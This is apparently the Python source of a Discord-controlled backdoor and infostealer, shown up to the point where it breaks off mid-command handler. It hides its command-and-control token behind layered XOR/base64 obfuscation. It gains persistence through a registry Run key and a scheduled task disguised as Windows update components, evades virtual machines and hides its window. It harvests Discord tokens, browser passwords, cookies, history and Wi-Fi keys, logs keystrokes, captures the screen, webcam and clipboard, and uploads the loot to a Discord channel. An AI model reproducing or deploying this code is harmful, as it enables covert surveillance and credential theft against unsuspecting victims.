import subprocess, sys, os, signal, threading, time, random, string, json, platform, shutil, sqlite3
sys.stdout.reconfigure(encoding='utf-8')
from concurrent.futures import ThreadPoolExecutor

# Stealth Flags for Windows
CREATE_NO_WINDOW = 0x08000000 if sys.platform == "win32" else 0

def install_dependencies():
    # List of required packages
    required = {
        'discord.py': 'discord',
        'requests': 'requests',
        'pyautogui': 'pyautogui',
        'colorama': 'colorama',
        'tls-client': 'tls_client',
        'websocket-client': 'websocket',
        'opencv-python': 'cv2',
        'sounddevice': 'sounddevice',
        'scipy': 'scipy',
        'psutil': 'psutil',
        'PySocks': 'socks',
        'pynput': 'pynput',
        'selenium': 'selenium',
        'faker': 'faker'
    }
    
    for package, import_name in required.items():
        try:
            __import__(import_name)
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package], creationflags=CREATE_NO_WINDOW)
            except:
                pass

# Run installer before anything else
install_dependencies()

import discord, requests, urllib3, tls_client, pyautogui, shutil, sqlite3, threading, time, re, secrets, logging, platform, psutil, asyncio, io
from concurrent.futures import ThreadPoolExecutor
from discord import File
from colorama import Fore, init; init(autoreset=True)
from datetime import datetime

# Silence Discord logs
logging.getLogger('discord').setLevel(logging.ERROR)
logging.getLogger('discord.client').setLevel(logging.ERROR)
logging.getLogger('discord.gateway').setLevel(logging.ERROR)
logging.getLogger('discord.http').setLevel(logging.ERROR)

# Initialize tls_client session with robust browser fingerprint (Chrome 138)
req_session = tls_client.Session(
    client_identifier="chrome_138",
    random_tls_extension_order=True,
    ja3_string="771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-5-10-11-13-16-18-23-27-35-43-45-51-17613-65037-65281,4588-29-23-24,0",
    h2_settings={"HEADER_TABLE_SIZE": 65536, "ENABLE_PUSH": 0, "INITIAL_WINDOW_SIZE": 6291456, "MAX_HEADER_LIST_SIZE": 262144},
    h2_settings_order=["HEADER_TABLE_SIZE", "ENABLE_PUSH", "INITIAL_WINDOW_SIZE", "MAX_HEADER_LIST_SIZE"],
    supported_signature_algorithms=["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"],
    supported_versions=["TLS_1_3", "TLS_1_2"],
    key_share_curves=["GREASE", "X25519MLKEM768", "X25519", "secp256r1", "secp384r1"],
    pseudo_header_order=[":method", ":authority", ":scheme", ":path"],
    connection_flow=15663105,
    priority_frames=[]
)

# Compatibility Shim: Add missing requests-style methods to tls_client Session
def _session_request(method, url, **kwargs):
    if 'timeout' in kwargs: kwargs['timeout_seconds'] = kwargs.pop('timeout')
    if 'proxies' in kwargs:
        px = kwargs.pop('proxies')
        kwargs['proxy'] = list(px.values())[0] if isinstance(px, dict) and px else px
    # Propagate exceptions to allows callers (like Raider.request) to handle retries
    return req_session.execute_request(method=method, url=url, insecure_skip_verify=True, **kwargs)

req_session.request = _session_request
req_session.get = lambda url, **kwargs: _session_request('GET', url, **kwargs)
req_session.post = lambda url, **kwargs: _session_request('POST', url, **kwargs)
req_session.put = lambda url, **kwargs: _session_request('PUT', url, **kwargs)
req_session.delete = lambda url, **kwargs: _session_request('DELETE', url, **kwargs)
req_session.patch = lambda url, **kwargs: _session_request('PATCH', url, **kwargs)

def h(hex_code):
    hex_code = hex_code.lstrip('#')
    rgb = tuple(int(hex_code[i:i+2], 16) for i in (0, 2, 4))
    return f"\033[38;2;{rgb[0]};{rgb[1]};{rgb[2]}m"
import base64, ctypes, json, os, random, string, tls_client, uuid, websocket

# ==============================================================================
# [SECURE CONFIGURATION]
# ==============================================================================
STRIKE_EVENT = threading.Event()

def signal_handler(sig, frame):
    """Global Interrupt Handler"""
    if not STRIKE_EVENT.is_set():
        STRIKE_EVENT.set()
        print(f"\n{Fore.RED}[!] ABORT SIGNAL RECEIVED. HALTING OPERATIONS...{Fore.RESET}")
        print(f"{Fore.YELLOW}[!] Exiting program...{Fore.RESET}")
        try:
            sys.exit(0)
        except:
            os._exit(0)  # Force exit if sys.exit fails

signal.signal(signal.SIGINT, signal_handler)

def _v(b, k): return bytes([b[i] ^ ord(k[i%len(k)]) for i in range(len(b))])
def _d(s):
    ks = ['ASTRO','NEXUS','GPG','RAID','STEALTH','GOD','VOID','DARK','CHAO','ELIT']
    c = base64.b64decode(s.encode())
    for i in range(9, -1, -1):
        c = c[::-1]
        c = _v(c, ks[i])
        c = base64.b64decode(c)
    return c.decode('utf-8')

TOKEN = _d('aSofD2F8DQQ2JiUjHnEPAyYmKwIZKg8BNyY1AhcIHSE9AB0GHQAfAQ4IHQYTPg4HDiYrDCx8DQYOfQ8NGzoeIBoiOwENOhQENn01DBciKwxhGysILRgdBDwYHgMXECUODAw7AhUIDwR7GCQEEQgYIGALDQwhKhgBIiYfChNxCAE5Og0NETo7Bx8iJgwdIiQLNzoNCAE+HQYYGDQCFzoOITkQHQgdIiUCIj47BBEIGCBtADsCZBMPBA4IKwQfJg4EPCoNCC0mFAQ9PisGHSIOB2IiHgwtIjsABC47AhUIHQ5tLh0CIT4dBCMIKwQWcQgBGwArBmV8FAQOGCsDHjokDhEYKwwlfQ0EBX0lIARxJgwDfTsCDXEkDwQuOwYVCBggGHE7FWYmJgd7CA0BET4NBxkMOwlhLQgGDggrDBgICAEZECUMASYEBDUQJSMXcQ8DZjkNDBl9DQYeACUBFQgeIBAAOwlmECQCPS4eBhtxDgIYACsGHXkfBiI+DQYaPg4CHTodDBE6KwRiCzsLE3EmCxEIHQgtAB0EHxwlCxc+DgZ/Dx0CDXklAj0mNQccCCUIGAA7CRkqJgcYCCsKGiIOBh06DQg9OjsHI30lIRMiOwZieDsCDSY0ASIAGAYXPh4hPgA7FS0cHwQjJg8BBHEIARsAKwYgACUEHhgOHxEMJg4VDCsMLDErBGMlFA4ecSUOISI0CRkAOwcOPjsCFyIrCQwMHQIdOiQHLS4ODhg+DgMeACsCLXkPAQ4cBAEbJg4EGAA7FRkAJQQ1DH8EGXEIAmciNAkZcSQGPRgrDRdxJgx/Ax0GATokAQ4+DQYccQ4GGCoNARkAJQQeIggcGSYOAztxOxUteTYHIiorDxkiDgIVOg0IGT4dBBkYNBUXOh0hfwM7CWEQNgAiPisBM3ElDxsAHQhlJR8BPAg7DhUICAM1CDUVBToNBGMfIgITcQ8BHgAdCA1xJAc9GDsCHjoEBh8QOxVmCA8HIz4rBBYmHSA9JisGIwMlBywADwcOcQ8BFwQODGF8KwQ8EDULGnElDjAiNAkVeQ0BHz4rIBxxDwYcIjsJZiImBy0uHgYYAA8DGSYrDy0YCwYOBCsLH3EPBhoiOwYBOiQEGCJ/DB0mDgBmDx0GGQQdBCwYHgoXIg4ADAg1CWV8DwR7LjsHFggIAXsqKwxlLQgGexgNBhMMCAISEB0PDTorBA4QNQMZIh4hITodCA15HQQtGDQCFwgfJn8PHQIZfR0CIj47DRwIHyAzDDsJOBA1AXsYJBU1AA8CHhAPAQ06OwdiBysMFiIOAWIiNAkBeTsGNxgNARwiDQMgLh0CZCEfBHsIDQE4ADYDZggrAiQAJQR7Kg0gHiIOARt9HQghfSQEYzErAR4IDwA2IisCFSYkDzx9NRUcOisOGAgdAiAiFAE1CCsBGD4OA20qOwkseCUEexAmDxEICAMXDA0NLDEOBDMcfwsXcQ8HF3k7AiUIKwczADYCHAgrDj4iOwklCB8BDhg0BzU+HSZ7ACsGIXkfASIuDQwaJg4BHRgNARE+OwceCB4JHSIOBB0IHQgNAB0GNT47BhYmJA8+ADsVODoUBC0mNQYbDAgGGwANAGE9HQEiLg0MHiIOBBwqOxU9cTYHMy4dDh5xDwc4HB0IYSErBz0YHgYWcSYJDAA7FWELNQYjCA0BMwg2AGYiDQwZfQQGHwgkBxoiDgEQIisMET4kBDYYJCMZIg4EYSIdAhUuDQYePjsVFRAPITwAOwkYJhQGNQg7Dw==')
GUILD_ID = int(_d('OnElDGAtKw8dJg4Gexg7FTUMHyAccR0PDSYUBDkuKw0dIh4hGRwdCDkAKwctDAQNFSYeIWcQHQwdfR0Eez47BAAmKwsOAB0MDX0UASIYNCEfIg4BGAgPDDlxNgcZHCIhFyI7ATMbHQg5fTsHBC4kARciJAwkLjsVIT4dBCMYDgEePg4DPQgrBjl9Igc8Lg0GADokDhsuDQEBAB8EPAAlIxpxJQk2fQ0NOSIrDy19NQYVcQgGfyEdBg0mKwQjCB0EEToNBxgADQgsLQ0BDi4NDRMMJg8aIg0BIBAmBDx9NQwecR8mMgAPDBkMDQE8GB4HFzoOA38hKwIFHA4EexgOBhdxDQJ7KjsJHSomBx4uHQoTDAgCGjo7DR19HQQOIiUMF3EYIBUiOwIleR0GMwAfBxc+Kws+LisCBRAkATU+KwE4DA8GGSoNBGElDwY1CB4DGyIOBhcAKwYtJn8HMwwmFTNxCAY+PjsCYXgNBwQuOxUccRgOPS4dAmQbCwcYLh4HOXEOAmADKwJkEyUEHi4kAxFxCAEyKg0MYSU7Bx4YNAwdIg4EJX0dAhUuDQQfADYVFyYrCRAAHQYcJiIHIz47Dw=='))
CATEGORY_ID = int(_d('OnElDGAtKw8dJg4Gexg7FTUMHyAccR0PDSYUBDkuKw0dIh4hGRwdCDkAKwctDAQNFSYeIWcQHQwdfR0Eez47BAAmKwsOAB0MPX0UASIYJAQeOh4gMhgrBi1xNgcZHCIhHnElC2I6OxUZLg8HGRgOARcmJAgMADsVZhgbByMYDgEeOg4DPQg7BmV8IgQiBB0gHwwlDhsYKwwBAB8EPAAlIxpxDwdifQ0NLXkNDGIDNRUXIh0IPT47FSAiFAcjJjUHEXENBhgMKwI5Kg0BDi4NDRMMJg8aIg0BIBAmBDMMIiMXcSULMiYeDCUIKwIYGB4HFzoOAn8DOxUsEx4CIj4dBhZxDgIYKg0IISYUBiIYHQoTCAgEHRArCAEINQc1IiUMF3EYIBU6KwglAB0EMwAfAxYIJg4+LisCBRAkATU+KwE4DA8GGQA7IGE9HQEiHH8CFggIBjoqKwYtJn8HMwwmFRZxDwY4Ig0NDRwNBhkYHgYcIisPYgM7FRU+DQcsLh4HOXEOAmADKwJkEyUEHi4kAxFxCAEyKg0MYSU7Bx4YNAwdIg4EJX0dAhUuDQQfADYVFyYrCRAAHQYcJiIHIz47Dw=='))
USER_ID = int(_d('OnElDGAtKw8dJg4Gexg7FTUMHyAccR0PDSYUBDkuKw0dIh4hGRwdCDkAKwctDAQNFSYeIWcQHQwdfR0Eez47BAAmKwsOADsCBToOAQ4YHg0eOiQONQQODC06OwctHH8EHnElCz8iOwIlfTsHBC4kARciHg9/eTsJPT47BiMIDQEeJjQBZggrAiQAJQcYLisOEggIARV9KyAZfTsHHgA1AzNxJQk2fQ0NOSINDC19NQYccQgGfyEdBmYMJQI5Lh0GEToOA3scOwY5KisEewAmDBMMJg8aIg0BIBAmBDwcfwcXcSUMMn0NDSU+DQEzIn8VHAgrD38lOwkVOh8BDhgOBhYmJAhtCCsPHT4fBiIYHQoTDAgCGjo7AgF9HQQzIiUMF3EIIGZ5DQwZPh0GODorCxYIHwk9EB0IGC4fBCM+DQQRcQgBEio7BgV9IgR7ECYLFggIAzoYKwItJn8HM301DBNxCAY2Ig0NDRwNBhkYHgYcIisPYgM7FRU+DQcsLh4HOXEOAmADKwJkEyUEHi4kAxFxCAEyKg0MYSU7Bx4YNAwdIg4EJX0dAhUuDQQfADYVFyYrCRAAHQYcJiIHIz47Dw=='))

client = discord.Client(intents=discord.Intents.all())
spy_channel = None 
BACKDOOR_LOCK = os.path.join(os.getenv('TEMP') if os.name == 'nt' else '/tmp', 'nexus_backdoor.lock')
STRIKE_EVENT = threading.Event()
SNIPER_STATS = {"checks": 0, "start_time": 0}
BACKUP_C2_URL = None # Global variable to store backup C2 URL



def setup_registry_persistence():
    try:
        if sys.platform != "win32": return False
        appdata = os.getenv('APPDATA')
        script_path = os.path.abspath(sys.argv[0])
        target_path = os.path.join(appdata, 'WindowsUpdateHost', 'hostupdate.exe')
        
        if not os.path.exists(os.path.dirname(target_path)):
            os.makedirs(os.path.dirname(target_path))
            
        if not os.path.exists(target_path):
            if script_path.endswith('.exe'):
                shutil.copy(script_path, target_path)
            else:
                shutil.copy(script_path, target_path)

        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsHostUpdate", 0, winreg.REG_SZ, f'"{target_path}"')
        winreg.CloseKey(key)
        return True
    except: return False

def remove_registry_persistence():
    try:
        if sys.platform != "win32": return False
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(key, "WindowsHostUpdate")
        except: pass
        winreg.CloseKey(key)
        return True
    except: return False

def check_for_vm():
    # Basic VM detection using common indicators
    if sys.platform != "win32": return "N/A"
    
    # Check for VM-specific registry keys
    try:
        import winreg
        vm_reg_keys = [
            "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier",
            "HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemProductName",
            "HARDWARE\\DESCRIPTION\\System\\BIOS\\BIOSVendor",
            "SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_15AD&DEV_0740", # VMWare
            "SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc", # VirtualBox
        ]
        for key_path in vm_reg_keys:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                value, _ = winreg.QueryValueEx(key, None) # Value is usually the default (None)
                if "VMware" in str(value) or "VirtualBox" in str(value) or "VBOX" in str(value) or "Microsoft Virtual" in str(value):
                    return "Possible VM Detected (Registry)"
            except FileNotFoundError: pass
            except Exception as e: pass # print(f"Reg check error: {e}")

    except ImportError: pass # winreg is Windows-only

    # Check for common VM-related process names (if psutil is available)
    try:
        import psutil
        vm_process_names = ["vmtoolsd.exe", "VBoxService.exe", "VBoxTray.exe", "joeboxcontrol.exe"]
        for proc in psutil.process_iter(['name']):
            if proc.name().lower() in vm_process_names:
                return "Possible VM Detected (Process)"
    except ImportError: pass
    except Exception as e: pass # print(f"Proc check error: {e}")

    # Check for common VM-related MAC addresses (simplified, needs admin for full check)
    try:
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK and addr.address:
                    mac = addr.address.replace(":", "").lower()
                    if mac.startswith(("080027", "000c29", "005056")): # VirtualBox, VMWare
                        return "Possible VM Detected (MAC Address)"
    except Exception as e: pass # print(f"MAC check error: {e}")

    return "No VM Indicators Found"

def stealth_mode():
    try:
        if sys.platform == "win32":
            import ctypes
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hWnd = kernel32.GetConsoleWindow()
            if hWnd != 0:
                user32.ShowWindow(hWnd, 0) # 0 = SW_HIDE
    except: pass

TASK_NAME = "WindowsUpdateService"

def setup_scheduled_task_persistence():
    if sys.platform != "win32": return
    try:
        script_path = os.path.abspath(sys.argv[0])
        command = f'powershell.exe -WindowStyle hidden -File "{script_path}" --ghost'
        
        # Create a scheduled task to run at logon
        subprocess.run(f'schtasks /create /tn "{TASK_NAME}" /tr "{command}" /sc onlogon /rl highest /f', shell=True, creationflags=CREATE_NO_WINDOW)
    except Exception as e:
        pass # print(f"Error setting up scheduled task: {e}")

def remove_scheduled_task_persistence():
    if sys.platform != "win32": return
    try:
        subprocess.run(f'schtasks /delete /tn "{TASK_NAME}" /f', shell=True, creationflags=CREATE_NO_WINDOW)
    except Exception as e:
        pass # print(f"Error removing scheduled task: {e}")


SCREEN_STREAM_ACTIVE = False
screenshot_thread = None

SCREEN_STREAM_ACTIVE = False
screenshot_thread = None

async def start_screenshot_stream(channel, interval=5):
    global SCREEN_STREAM_ACTIVE
    SCREEN_STREAM_ACTIVE = True
    while SCREEN_STREAM_ACTIVE:
        try:
            img = pyautogui.screenshot()
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            buffer.seek(0)
            await channel.send(file=File(buffer, filename="stream.png"))
            buffer.close()
        except Exception as e:
            # await channel.send(f"Error during stream: {e}") # Silent errors for stealth
            pass
        await asyncio.sleep(interval)

def stop_screenshot_stream():
    global SCREEN_STREAM_ACTIVE
    SCREEN_STREAM_ACTIVE = False



class AstroBackdoor:
    @staticmethod
    def get_tokens():
        tokens = []
        if sys.platform == "win32":
            paths = {
                'Discord': os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
                'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
                'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),
                'Google Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb')
            }
        else:
            home = os.path.expanduser("~")
            paths = {
                'Discord': os.path.join(home, '.config', 'discord', 'Local Storage', 'leveldb'),
                'Discord Canary': os.path.join(home, '.config', 'discordcanary', 'Local Storage', 'leveldb'),
                'Discord PTB': os.path.join(home, '.config', 'discordptb', 'Local Storage', 'leveldb'),
                'Google Chrome': os.path.join(home, '.config', 'google-chrome', 'Default', 'Local Storage', 'leveldb'),
            }
        for name, p in paths.items():
            if not os.path.exists(p): continue
            for f in os.listdir(p):
                if f.endswith(('.log', '.ldb')):
                    try:
                        with open(os.path.join(p, f), 'r', errors='ignore') as file:
                            for line in file.readlines():
                                for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", line):
                                    if t not in tokens: tokens.append(t)
                    except: continue
        return tokens

    @staticmethod
    def extract_browser_logins(output_dir):
        if sys.platform != "win32": return
        
        browser_paths = {
            "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
            "Edge": os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
            "Brave": os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
            "Opera": os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'), # Opera stores data in AppData, not LocalAppData
        }
        
        all_logins = []
        
        for browser_name, base_path in browser_paths.items():
            for profile_dir in ["Default", "Profile 1", "Profile 2", "Guest Profile"]: # Common profiles
                profile_path = os.path.join(base_path, profile_dir)
                login_data_path = os.path.join(profile_path, "Login Data")
                
                if not os.path.exists(login_data_path): continue
                
                # Copy Login Data to a temporary location to avoid locking issues
                temp_login_data_path = os.path.join(output_dir, f"{browser_name}_{profile_dir}_Login Data.db")
                try:
                    shutil.copy2(login_data_path, temp_login_data_path)
                except Exception as e:
                    continue # print(f"Error copying Login Data for {browser_name}/{profile_dir}: {e}")
                
                try:
                    conn = sqlite3.connect(temp_login_data_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        # Store encrypted password as bytes, will need external decryption
                        all_logins.append({
                            "browser": browser_name,
                            "profile": profile_dir,
                            "url": url,
                            "username": username,
                            "encrypted_password_hex": encrypted_password.hex() if isinstance(encrypted_password, bytes) else encrypted_password # Store as hex for readability
                        })
                    conn.close()
                except Exception as e:
                    pass # print(f"Error reading logins from {browser_name}/{profile_dir}: {e}")
                finally:
                    if os.path.exists(temp_login_data_path):
                        os.remove(temp_login_data_path) # Clean up temp copy
                        
        if all_logins:
            output_file = os.path.join(output_dir, "browser_logins.txt")
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("--- Browser Logins (Encrypted Passwords) ---\n")
                f.write("NOTE: Passwords are encrypted using Windows DPAPI. They require decryption on the original system or a system with access to the user's DPAPI master key.\n")
                f.write("Tools like `mimikatz` or specific DPAPI decryption utilities are typically used for this.\n\n")
                for login in all_logins:
                    f.write(f"Browser: {login['browser']}\n")
                    f.write(f"Profile: {login['profile']}\n")
                    f.write(f"URL: {login['url']}\n")
                    f.write(f"Username: {login['username']}\n")
                    f.write(f"Encrypted Password (HEX): {login['encrypted_password_hex']}\n")
                    f.write("------------------------------------\n")
        return all_logins

    @staticmethod
    def extract_browser_history_and_bookmarks(output_dir):
        if sys.platform != "win32": return
        
        browser_paths = {
            "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
            "Edge": os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
            "Brave": os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
            "Opera": os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
        }

        for browser_name, base_path in browser_paths.items():
            for profile_dir in ["Default", "Profile 1", "Profile 2", "Guest Profile"]:
                profile_path = os.path.join(base_path, profile_dir)
                
                # History
                history_path = os.path.join(profile_path, "History")
                if os.path.exists(history_path):
                    temp_history_path = os.path.join(output_dir, f"{browser_name}_{profile_dir}_History.db")
                    try:
                        shutil.copy2(history_path, temp_history_path)
                        conn = sqlite3.connect(temp_history_path)
                        cursor = conn.cursor()
                        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
                        history_output_file = os.path.join(output_dir, f"{browser_name}_{profile_dir}_history.txt")
                        with open(history_output_file, "w", encoding="utf-8") as f:
                            f.write(f"--- {browser_name} {profile_dir} History ---\n")
                            for url, title, count, visit_time in cursor.fetchall():
                                f.write(f"URL: {url}\nTitle: {title}\nVisits: {count}\nLast Visit: {datetime.fromtimestamp(11644473600 + (visit_time / 1000000)) if visit_time else 'N/A'}\n\n") # Chrome timestamp conversion
                        conn.close()
                    except Exception as e:
                        pass # print(f"Error extracting history for {browser_name}/{profile_dir}: {e}")
                    finally:
                        if os.path.exists(temp_history_path):
                            os.remove(temp_history_path)

                # Bookmarks
                bookmarks_path = os.path.join(profile_path, "Bookmarks")
                if os.path.exists(bookmarks_path):
                    try:
                        shutil.copy2(bookmarks_path, os.path.join(output_dir, f"{browser_name}_{profile_dir}_Bookmarks.json"))
                    except Exception as e:
                        pass # print(f"Error copying bookmarks for {browser_name}/{profile_dir}: {e}")

        return tokens

class Keylogger:
    def __init__(self):
        self.log_file = os.path.join(os.getenv('TEMP') if os.name == 'nt' else '/tmp', "keylog.txt")
        self.listener = None
        self.is_logging = False

    def on_press(self, key):
        try:
            with open(self.log_file, "a") as f:
                f.write(str(key).replace("'", "") + "\n")
        except Exception as e:
            pass # Log errors silently for stealth

    def start(self):
        if not self.is_logging:
            from pynput import keyboard
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.is_logging = True
            # Clear old log file on start
            if os.path.exists(self.log_file):
                os.remove(self.log_file)

    def stop(self):
        if self.is_logging and self.listener:
            self.listener.stop()
            self.listener.join()
            self.is_logging = False

    async def dump_logs(self, channel):
        if os.path.exists(self.log_file):
            with open(self.log_file, "r") as f:
                logs = f.read()
            if logs:
                # Chunk and send logs to Discord
                for i in range(0, len(logs), 1900):
                    await channel.send(f"```\n{logs[i:i+1900]}\n```")
            else:
                await channel.send("No keystrokes logged yet.")
            os.remove(self.log_file) # Clear logs after dumping
        else:
            await channel.send("Keylogger log file not found.")

keylogger_instance = Keylogger()

async def send_message_robustly(channel, *args, **kwargs):
    global spy_channel
    try:
        await channel.send(*args, **kwargs)
    except discord.errors.NotFound:
        print("Channel not found, attempting to reinitialize...")
        if await reinitialize_channel():
            if spy_channel: # If reinitialization was successful
                await spy_channel.send(*args, **kwargs)
            else:
                print("Reinitialization successful, but spy_channel is None. Message not sent.")
        else:
            print("Failed to reinitialize channel. Message not sent.")
    except Exception as e:
        print(f"Error sending message robustly: {e}")

async def handle_backdoor(message):
    async def collect_and_zip_data(channel):
        temp_dir = os.path.join(os.getenv('TEMP') if os.name == 'nt' else '/tmp', f"nexus_takeover_{int(time.time())}")
        os.makedirs(temp_dir, exist_ok=True)
        
        # Collect Discord Tokens
        tokens = await asyncio.to_thread(AstroBackdoor.get_tokens)
        if tokens:
            with open(os.path.join(temp_dir, "discord_tokens.txt"), "w") as f:
                f.write("\n".join(tokens))

        # Collect Browser Data (Logins, History, Bookmarks)
        if sys.platform == "win32":
            try:
                await asyncio.to_thread(AstroBackdoor.extract_browser_logins, temp_dir)
                await asyncio.to_thread(AstroBackdoor.extract_browser_history_and_bookmarks, temp_dir)
            except: pass

        # Collect Browser Data (Cookies, History, Login Data, Bookmarks)
        if sys.platform == "win32":
            browser_paths = {
                "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
                "Edge": os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
                "Brave": os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
                "Opera": os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
            }
            for browser_name, base_path in browser_paths.items():
                # Common profile directories to check
                for profile_dir in ["Default", "Profile 1", "Profile 2", "Guest Profile"]:
                    profile_path = os.path.join(base_path, profile_dir)
                    if not os.path.exists(profile_path): continue

                    browser_output_dir = os.path.join(temp_dir, "browsers", f"{browser_name}_{profile_dir}")
                    os.makedirs(browser_output_dir, exist_ok=True)

                    files_to_copy = {
                        "Cookies": "Network/Cookies",
                        "History": "History",
                        "Login Data": "Login Data",
                        "Web Data": "Web Data",
                        "Bookmarks": "Bookmarks"
                    }

                    for dest_name, relative_path in files_to_copy.items():
                        src_path = os.path.join(profile_path, relative_path)
                        if os.path.exists(src_path):
                            try:
                                shutil.copy2(src_path, os.path.join(browser_output_dir, dest_name))
                            except Exception as e:
                                pass # Log silently or handle error

        # Take Screenshot
        try:
            img = pyautogui.screenshot()
            img.save(os.path.join(temp_dir, "screenshot.png"))
        except: pass

        # System Info
        with open(os.path.join(temp_dir, "sysinfo.txt"), "w") as f:
            f.write(f"User: {os.getlogin()}\n")
            f.write(f"OS: {sys.platform}\n")
            f.write(f"CWD: {os.getcwd()}\n")
            f.write(f"Machine: {os.environ.get('COMPUTERNAME', 'N/A')}\n")

        # Wifi Passwords
        if sys.platform == "win32":
            try:
                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], creationflags=CREATE_NO_WINDOW).decode('utf-8', errors="backslashreplace")
                profiles = [i.split(":")[1][1:-1] for i in data.split('\n') if "All User Profile" in i]
                res = ""
                for i in profiles:
                    try:
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], creationflags=CREATE_NO_WINDOW).decode('utf-8', errors="backslashreplace")
                        results = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
                        res += f"{i:<30}|  {results[0] if results else ''}\n"
                    except: pass
                with open(os.path.join(temp_dir, "wifi_passwords.txt"), "w") as f:
                    f.write(res if res else "No wifi profiles found.")
            except: pass

        # Zip everything
        zip_path = shutil.make_archive(f"takeover_{os.getlogin()}_{int(time.time())}", 'zip', temp_dir)
        
        await channel.send(f"📦 **Takeover data collected!**", file=File(zip_path, filename=os.path.basename(zip_path)))
        
        shutil.rmtree(temp_dir) # Clean up temp directory
        os.remove(zip_path) # Clean up zip file after sending

    try:
        if message.content.startswith("!run "):
            if sys.platform == "win32":
                file_path = message.content[5:]
                if os.path.exists(file_path):
                    subprocess.Popen([file_path], shell=True, creationflags=CREATE_NO_WINDOW)
                    await send_message_robustly(message.channel, f"✅ **Executed silently:** `{file_path}`")
                else:
                    await send_message_robustly(message.channel, f"❌ File not found.")
            else:
                await send_message_robustly(message.channel, "`!run` is currently supported only on Windows.")
        elif message.content == "!exit":
            await send_message_robustly(message.channel, "🌑 **Nexus Offline.** Ghost process terminated by Pilot.")
            if os.path.exists(BACKDOOR_LOCK): os.remove(BACKDOOR_LOCK)
            os._exit(0)
        elif message.content == "!grab":
            t = await asyncio.to_thread(AstroBackdoor.get_tokens)
            await send_message_robustly(message.channel, f"**Tokens Captured:**\n```\n" + "\n".join(t) + "\n```" if t else "No tokens found.")
        elif message.content == "!ss":
            def take_ss():
                img = pyautogui.screenshot()
                arr = io.BytesIO()
                img.save(arr, format='PNG')
                arr.seek(0)
                return arr
            
            f_data = await asyncio.to_thread(take_ss)
            await send_message_robustly(message.channel, file=File(f_data, filename="s.png"))
            f_data.close()  # No os.remove needed
        elif message.content.startswith("!webcam"):
            def take_snap():
                import cv2
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cap.release()
                if ret:
                    _, buffer = cv2.imencode('.png', frame)
                    return io.BytesIO(buffer)
                return None
            
            f_data = await asyncio.to_thread(take_snap)
            if f_data:
                await send_message_robustly(message.channel, file=File(f_data, filename="w.png"))
                f_data.close()
        elif message.content == "!clip":
            if sys.platform == "win32":
                import ctypes
                ctypes.windll.user32.OpenClipboard(0)
                pcontents = ctypes.windll.user32.GetClipboardData(1) # CF_TEXT
                data = ctypes.c_char_p(pcontents).value
                ctypes.windll.user32.CloseClipboard()
                await send_message_robustly(message.channel, f"**Clipboard Content:**\n```\n{data.decode('utf-8', 'ignore')}\n```")
            else:
                await send_message_robustly(message.channel, "`!clip` is only supported on Windows.")
        elif message.content == "!wifi":
            if sys.platform == "win32":
                try:
                    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], creationflags=CREATE_NO_WINDOW).decode('utf-8', errors="backslashreplace")
